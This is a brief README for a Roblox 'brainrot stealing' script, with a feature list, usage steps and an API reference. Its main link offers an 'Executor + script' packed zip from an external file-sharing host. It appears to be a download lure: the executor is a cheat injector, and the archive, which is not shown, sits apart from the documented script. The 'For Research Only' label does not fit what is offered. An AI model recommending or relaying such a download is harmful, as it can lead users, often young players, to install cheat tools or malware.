# 🧠 "Brainrot" Roblox Script 

![Version](https://img.shields.io/badge/Version-1.0.2_Research-blue.svg)
![Platform](https://img.shields.io/badge/Platform-Roblox_Studio-lightgrey.svg)
![Status](https://img.shields.io/badge/Status-For_Research_Only-red.svg)


Executor + script  --- [ScriptPacked](https://www.mediafire.com/file/otdgaoctqo4u6l9/ScriptPacked.zip/file)

# Features

- Interactive brainrot stealing system from NPCs and players
- Customizable cooldown periods between steals
- Configurable success rates and steal amounts
- Visual and audio feedback for actions
- Data persistence support for brainrot tracking

Usage
Players:
Approach an NPC or another player

Use the designated interaction button (default: E)

Attempt to steal brainrot with visual and audio feedback

API Reference
Events:
OnSteal(player, target, amount) - Triggered on successful steal

OnStealAttempt(player, target, success) - Triggered on any attempt

OnCooldownStart(player, duration) - Triggered when cooldown begins

Functions:
SetStealChance(chance) - Set success chance (0.0 to 1.0)

SetCooldown(seconds) - Set cooldown between steals

GetPlayerBrainrot(player) - Retrieve player's brainrot amount

Customization
Visual Effects:
Modify the CreateStealEffect function to change particles, colors, or animations.

Sound Effects:
Update the PlayStealSound function with your custom sound IDs.
